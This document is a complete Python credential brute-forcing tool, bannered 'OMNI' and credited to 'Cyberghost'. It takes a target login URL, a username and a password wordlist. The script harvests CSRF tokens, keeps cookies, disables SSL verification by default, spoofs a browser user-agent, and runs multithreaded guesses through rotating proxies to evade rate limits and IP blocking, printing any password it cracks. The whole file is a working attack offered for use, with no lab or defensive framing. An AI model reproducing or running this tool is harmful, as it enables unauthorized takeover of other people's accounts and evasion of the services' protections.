import requests
import time
import sys
import json
import re
import threading
import time 
from queue import Queue
from urllib.parse import urlparse, quote
from urllib3 import exceptions
from colorama import Fore, Style, init

# Suppress warnings and init colors
requests.packages.urllib3.disable_warnings(category=exceptions.InsecureRequestWarning)
init(autoreset=True)

# Global variables for thread coordination
found = False
lock = threading.Lock()

def print_banner():
    banner = f"""
{Fore.RED} ██████╗ ███╗   ███╗███╗   ██╗██╗
{Fore.RED}██╔═══██╗████╗ ████║████╗  ██║██║
{Fore.YELLOW}██║   ██║██╔████╔██║██╔██╗ ██║██║
{Fore.GREEN}██║   ██║██║╚██╔╝██║██║╚██╗██║██║
{Fore.BLUE}╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║
 {Fore.MAGENTA}╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝
                                 
    {Fore.YELLOW}★ Built by Cyberghost | Credit to the CyberPantheon  ★ {Style.RESET_ALL}
    """
    print(banner)

class ProxyManager:
    def __init__(self, proxy_source):
        self.proxies = []
        self.proxy_index = 0
        self.load_proxies(proxy_source)
        self.validate_proxies()

    def load_proxies(self, source):
        try:
            if source.startswith('http'):
                response = requests.get(source)
                proxies = response.text.splitlines()
            else:
                with open(source, 'r') as f:
                    proxies = f.read().splitlines()
            
            for proxy in proxies:
                parts = proxy.split(':')
                if len(parts) == 4:
                    ip, port, user, passwd = parts
                    self.proxies.append({
                        'http': f'http://{user}:{passwd}@{ip}:{port}',
                        'https': f'http://{user}:{passwd}@{ip}:{port}'
                    })
                elif len(parts) == 2:
                    ip, port = parts
                    self.proxies.append({
                        'http': f'http://{ip}:{port}',
                        'https': f'http://{ip}:{port}'
                    })
                    
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to load proxies: {str(e)}")
            sys.exit(1)

    def validate_proxies(self):
        valid_proxies = []
        print(f"{Fore.YELLOW}[*] Validating proxies...")
        for proxy in self.proxies:
            try:
                test = requests.get(
                    'http://httpbin.org/ip',
                    proxies=proxy,
                    timeout=10,
                    verify=False
                )
                if test.status_code == 200:
                    valid_proxies.append(proxy)
                    print(f"{Fore.GREEN}[+] Valid proxy: {proxy['http']}")
            except:
                continue
        self.proxies = valid_proxies
        print(f"{Fore.CYAN}[*] Active proxies: {len(self.proxies)}")

    def get_next_proxy(self):
        with lock:
            if self.proxy_index >= len(self.proxies):
                self.proxy_index = 0
            proxy = self.proxies[self.proxy_index]
            self.proxy_index += 1
            return proxy

def worker(args):
    global found
    config, proxy_manager, password_queue = args
    
    while not found and not password_queue.empty():
        password = password_queue.get()
        if found:
            password_queue.task_done()
            return

        proxy = proxy_manager.get_next_proxy() if proxy_manager else None
        session = requests.Session()
        session.verify = config['verify_ssl']
        
        if config['needs_cookies']:
            session.get(config['login_page_url'], verify=config['verify_ssl'])
        
        if config['csrf_token']:
            config['payload_template'][config['csrf_field']] = config['csrf_token']

        try:
            payload = config['payload_template'].copy()
            payload[config['password_field']] = password
            
            headers = config['headers'].copy()
            if config['request_type'] == "json":
                headers["Content-Type"] = "application/json"
            else:
                headers["Content-Type"] = "application/x-www-form-urlencoded"

            start_time = time.time()
            
            if config['request_type'] == "json":
                response = session.post(
                    config['login_url'],
                    json=payload,
                    headers=headers,
                    proxies=proxy,
                    timeout=config['timeout'],
                    allow_redirects=config['check_redirect']
                )
            else:
                data = "&".join([f"{k}={quote(v)}" for k, v in payload.items()])
                response = session.post(
                    config['login_url'],
                    data=data,
                    headers=headers,
                    proxies=proxy,
                    timeout=config['timeout'],
                    allow_redirects=config['check_redirect']
                )
                
            response_time = time.time() - start_time

            # Enhanced success detection
            detected = False
            indicators = []
            
            # 1. Check status code
            if 200 <= response.status_code < 300:
                indicators.append(f"status {response.status_code}")
            
            # 2. Check keywords
            content = response.text.lower()
            if config['success_keyword'].lower() in content:
                indicators.append("success keyword")
            if config['failure_keyword'].lower() in content:
                indicators = ["failure keyword"]
            
            # 3. Check redirect
            if config['check_redirect'] and response.history:
                indicators.append("redirect")
            
            # 4. Check cookies
            if config['check_cookies'] and len(response.cookies) > 0:
                indicators.append("new cookies")
            
            # 5. Check JSON response
            try:
                json_resp = response.json()
                if "success" in json_resp and json_resp["success"]:
                    indicators.append("JSON success flag")
                if config['success_indicator'] in json_resp.get('message', ''):
                    indicators.append("API success message")
            except:
                pass

            # Determine result
            success = (
                (len(indicators) > 0 and "failure keyword" not in indicators
            ) and any(
                ind in indicators 
                for ind in ["redirect", "new cookies", "JSON success flag", "API success message"]
            ))

            with lock:
                sys.stdout.write(
                    f"\r{Fore.YELLOW}[*] Attempt: {password.ljust(25)} "
                    f"{Fore.BLUE}Status: {response.status_code} "
                    f"{Fore.MAGENTA}Time: {response_time:.2f}s "
                    f"{Fore.CYAN}Proxy: {proxy['http'] if proxy else 'Direct'}"
                    f"{Fore.GREEN if success else Fore.RED}{' ✓' if success else ' ✗'}"
                )
                sys.stdout.flush()

                if success:
                    found = True
                    print(f"\n\n{Fore.GREEN}[+] SUCCESS! Valid credentials found!")
                    print(f"{Fore.CYAN}[+] Username: {config['username']}")
                    print(f"{Fore.CYAN}[+] Password: {password}")
                    print(f"{Fore.CYAN}[+] Detected indicators: {', '.join(indicators)}")
                    
                    if proxy:
                        print(f"{Fore.CYAN}[+] Proxy Used: {proxy['http']}")
                    
                    # Show technical details
                    print(f"\n{Fore.YELLOW}[*] Technical details:")
                    print(f"  {Fore.CYAN}Final URL: {response.url}")
                    print(f"  {Fore.CYAN}Response Code: {response.status_code}")
                    print(f"  {Fore.CYAN}Cookies: {len(response.cookies)} received")
                    print(f"  {Fore.CYAN}Response Time: {response_time:.2f}s")
                    
                    # Show important headers
                    print(f"\n{Fore.YELLOW}[*] Response Headers:")
                    for k, v in response.headers.items():
                        if k.lower() in ['set-cookie', 'location', 'content-type']:
                            print(f"  {Fore.CYAN}{k}: {v}")
                    
                    return

        except Exception as e:
            pass
        finally:
            password_queue.task_done()
            time.sleep(config['delay'])

def get_input(prompt, default=None, required=False, example=None):
    while True:
        try:
            text = f"{Fore.BLUE}[?] {prompt}"
            if default:
                text += f" [{default}]: "
            else:
                text += ": "
            
            if example:
                text += f"{Fore.WHITE}(e.g. {example}) "
                
            value = input(text).strip()
            
            if not value and default:
                return default
            if required and not value:
                print(f"{Fore.RED}[!] This field is required")
                continue
            return value
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[-] Configuration aborted")
            sys.exit(1)

def detect_request_type(url):
    try:
        response = requests.get(url, verify=False, timeout=5)
        if "application/json" in response.headers.get("Content-Type", ""):
            return "json"
        return "form"
    except:
        return None

def get_csrf_token(session, login_page_url, csrf_field):
    try:
        response = session.get(login_page_url, verify=False)
        for pattern in [
            rf'name="{csrf_field}" value="([^"]+)"',
            rf'csrf-token" content="([^"]+)"',
            rf'"csrfToken":"([^"]+)"'
        ]:
            match = re.search(pattern, response.text)
            if match:
                return match.group(1)
        return None
    except:
        return None

def brute_force():
    print_banner()
    config = {}
    
    # Phase 1: Target Configuration
    print(f"\n{Fore.YELLOW}=== Target Configuration ===")
    config['login_url'] = get_input(
        "Login POST URL", 
        example="https://example.com/login or https://api.example.com/auth",
        required=True
    )
    
    config['login_page_url'] = get_input(
        "Login page URL (for CSRF/cookies)", 
        example="https://example.com/login",
        required=False
    ) or config['login_url']
    
    config['request_type'] = get_input(
        "Request type (form/json/auto)", 
        default="auto",
        example="form"
    ).lower()
    
    if config['request_type'] == "auto":
        detected_type = detect_request_type(config['login_page_url'])
        config['request_type'] = detected_type or get_input(
            "Couldn't auto-detect type. Enter manually (form/json)",
            required=True
        )

    # Phase 2: Field Configuration
    print(f"\n{Fore.YELLOW}=== Field Configuration ===")
    config['username_field'] = get_input(
        "Username/email field name", 
        default="email",
        example="username"
    )
    
    config['password_field'] = get_input(
        "Password field name", 
        default="password"
    )
    
    # Additional fields
    config['extra_fields'] = {}
    while True:
        field = get_input(
            "Add additional field? (leave blank to finish)", 
            required=False
        )
        if not field:
            break
        value = get_input(f"Value for '{field}'", required=True)
        config['extra_fields'][field] = value

    # Phase 3: Security Configuration
    print(f"\n{Fore.YELLOW}=== Security Configuration ===")
    config['csrf_field'] = get_input(
        "CSRF token field name (if any)", 
        required=False,
        example="csrf_token"
    )
    
    config['needs_cookies'] = get_input(
        "Maintain session cookies? (yes/no)", 
        default="yes"
    ).lower() == "yes"
    
    config['verify_ssl'] = get_input(
        "Verify SSL? (yes/no)", 
        default="no"
    ).lower() == "yes"

    # Phase 4: Success Detection
    print(f"\n{Fore.YELLOW}=== Success Detection ===")
    config['success_keyword'] = get_input(
        "Success indicator keyword", 
        example="Welcome, Dashboard"
    )
    
    config['failure_keyword'] = get_input(
        "Failure indicator keyword", 
        example="Invalid credentials"
    )
    
    config['check_cookies'] = get_input(
        "Check for success cookies? (yes/no)", 
        default="yes"
    ).lower() == "yes"
    
    config['check_redirect'] = get_input(
        "Check for redirects on success? (yes/no)", 
        default="yes"
    ).lower() == "yes"

    # Phase 5: Attack Parameters
    print(f"\n{Fore.YELLOW}=== Attack Parameters ===")
    config['username'] = get_input(
        "Username/email to test", 
        required=True,
        example="user@example.com"
    )
    
    wordlist_path = get_input(
        "Wordlist path", 
        required=True,
        example="/path/to/passwords.txt"
    )
    
    config['delay'] = float(get_input(
        "Delay between attempts (seconds)", 
        default="1"
    ))
    
    config['timeout'] = int(get_input(
        "Request timeout", 
        default="10"
    ))
    
    # Proxy configuration
    use_proxies = get_input(
        "Use proxies? (yes/no)", 
        default="yes"
    ).lower() == "yes"
    
    proxy_manager = None
    if use_proxies:
        proxy_source = get_input(
            "Proxy list path/URL", 
            example="/path/to/proxies.txt or http://api.proxy.com/list"
        )
        proxy_manager = ProxyManager(proxy_source)

    # Load wordlist
    try:
        with open(wordlist_path, "r", errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to load wordlist: {str(e)}")
        return

    # Initialize CSRF token if needed
    config['csrf_token'] = None
    if config['csrf_field']:
        with requests.Session() as test_session:
            test_session.verify = config['verify_ssl']
            config['csrf_token'] = get_csrf_token(
                test_session, 
                config['login_page_url'], 
                config['csrf_field']
            )
            if config['csrf_token']:
                print(f"{Fore.GREEN}[+] Found CSRF token: {config['csrf_token'][:15]}...")
            else:
                print(f"{Fore.YELLOW}[-] No CSRF token found")

    # Prepare payload template
    config['payload_template'] = {
        config['username_field']: config['username'],
        **config['extra_fields']
    }
    
    # Prepare headers
    config['headers'] = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "application/json, text/html, */*"
    }

    # Start attack
    print(f"\n{Fore.YELLOW}[*] Starting attack against {config['login_url']}")
    print(f"{Fore.CYAN}[*] Target: {config['username']}")
    print(f"{Fore.CYAN}[*] Loaded {len(passwords)} passwords")
    print(f"{Fore.CYAN}[*] Request type: {config['request_type'].upper()}")
    if proxy_manager:
        print(f"{Fore.CYAN}[*] Using {len(proxy_manager.proxies)} proxies")

    # Prepare password queue
    password_queue = Queue()
    for pwd in passwords:
        password_queue.put(pwd)
    
    # Determine thread count
    thread_count = min(
        int(get_input(
            "Concurrent threads", 
            default=str(min(10, len(proxy_manager.proxies)) if proxy_manager else 1)
        )),
        len(proxy_manager.proxies) if proxy_manager else 1
    )

    # Create worker threads
    args = (config, proxy_manager, password_queue)
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker, args=(args,))
        t.daemon = True
        threads.append(t)
        t.start()
    
    # Wait for completion
    try:
        while any(t.is_alive() for t in threads):
            time.sleep(0.5)
            if found:
                break
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[-] Attack interrupted by user")
        sys.exit(1)
    
    if not found:
        print(f"\n{Fore.RED}[-] Password not found in wordlist")

if __name__ == "__main__":
    brute_force()